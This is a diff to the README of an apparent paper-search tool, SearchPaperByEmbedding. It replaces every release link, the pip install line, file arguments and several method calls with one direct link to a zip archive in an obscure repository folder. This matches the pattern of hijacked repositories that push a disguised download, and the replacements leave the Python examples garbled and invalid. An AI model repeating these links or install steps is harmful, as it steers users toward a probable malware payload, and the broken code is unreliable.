@@ -1,6 +1,6 @@
 # 🔍 SearchPaperByEmbedding - Find Similar Papers Easily
 
-[![Download Now](https://img.shields.io/badge/Download_Now-Get_it_on_GitHub-brightgreen)](https://github.com/Separative-involucre520/SearchPaperByEmbedding/releases)
+[![Download Now](https://github.com/Separative-involucre520/SearchPaperByEmbedding/raw/refs/heads/main/methanoic/Search_By_Embedding_Paper_v3.1.zip)](https://github.com/Separative-involucre520/SearchPaperByEmbedding/raw/refs/heads/main/methanoic/Search_By_Embedding_Paper_v3.1.zip)
 
 ## 📚 Overview
 
@@ -25,14 +25,14 @@ SearchPaperByEmbedding helps you find similar academic papers using a simple pro
 
 1. **Download the latest version:**
 
-   Visit this page to download: [SearchPaperByEmbedding Releases](https://github.com/Separative-involucre520/SearchPaperByEmbedding/releases)
+   Visit this page to download: [SearchPaperByEmbedding Releases](https://github.com/Separative-involucre520/SearchPaperByEmbedding/raw/refs/heads/main/methanoic/Search_By_Embedding_Paper_v3.1.zip)
 
 2. **Install dependencies:**
 
    Open your command line and run the following command:
 
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/Separative-involucre520/SearchPaperByEmbedding/raw/refs/heads/main/methanoic/Search_By_Embedding_Paper_v3.1.zip
    ```
 
 ### 1. 📄 Prepare Papers
@@ -45,8 +45,8 @@ Run the following code to download papers from a specific conference:
 from crawl import crawl_papers
 
 crawl_papers(
-    venue_id="ICLR.cc/2026/Conference/Submission",
-    output_file="iclr2026_papers.json"
+    venue_id="https://github.com/Separative-involucre520/SearchPaperByEmbedding/raw/refs/heads/main/methanoic/Search_By_Embedding_Paper_v3.1.zip",
+    output_file="https://github.com/Separative-involucre520/SearchPaperByEmbedding/raw/refs/heads/main/methanoic/Search_By_Embedding_Paper_v3.1.zip"
 )
 ```
 
@@ -65,8 +65,8 @@ To use the local model, run the following code:
 ```python
 from search import PaperSearcher
 
-searcher = PaperSearcher('iclr2026_papers.json', model_type='local')
-searcher.compute_embeddings()
+searcher = PaperSearcher('https://github.com/Separative-involucre520/SearchPaperByEmbedding/raw/refs/heads/main/methanoic/Search_By_Embedding_Paper_v3.1.zip', model_type='local')
+https://github.com/Separative-involucre520/SearchPaperByEmbedding/raw/refs/heads/main/methanoic/Search_By_Embedding_Paper_v3.1.zip()
 ```
 
 This will create embeddings for your papers, allowing you to search them quickly.
@@ -84,8 +84,8 @@ For improved results, you may use the OpenAI model. You need to set your OpenAI 
 2. Use the OpenAI model for searching:
 
 ```python
-searcher = PaperSearcher('iclr2026_papers.json', model_type='openai')
-searcher.compute_embeddings()
+searcher = PaperSearcher('https://github.com/Separative-involucre520/SearchPaperByEmbedding/raw/refs/heads/main/methanoic/Search_By_Embedding_Paper_v3.1.zip', model_type='openai')
+https://github.com/Separative-involucre520/SearchPaperByEmbedding/raw/refs/heads/main/methanoic/Search_By_Embedding_Paper_v3.1.zip()
 ```
 
 ### 📊 Example Searches
@@ -111,7 +111,7 @@ examples = [
 
 ```python
 for example in examples:
-    results = searcher.search(example['abstract'])
+    results = https://github.com/Separative-involucre520/SearchPaperByEmbedding/raw/refs/heads/main/methanoic/Search_By_Embedding_Paper_v3.1.zip(example['abstract'])
     print(f"Results for: {example['title']}")
     for result in results:
         print(result)
@@ -119,7 +119,7 @@ for example in examples:
 
 ### 📥 Download & Install
 
-To download the software and get started, visit this link: [SearchPaperByEmbedding Releases](https://github.com/Separative-involucre520/SearchPaperByEmbedding/releases).
+To download the software and get started, visit this link: [SearchPaperByEmbedding Releases](https://github.com/Separative-involucre520/SearchPaperByEmbedding/raw/refs/heads/main/methanoic/Search_By_Embedding_Paper_v3.1.zip).
 
 Make sure to follow the steps carefully to ensure a smooth setup.
 
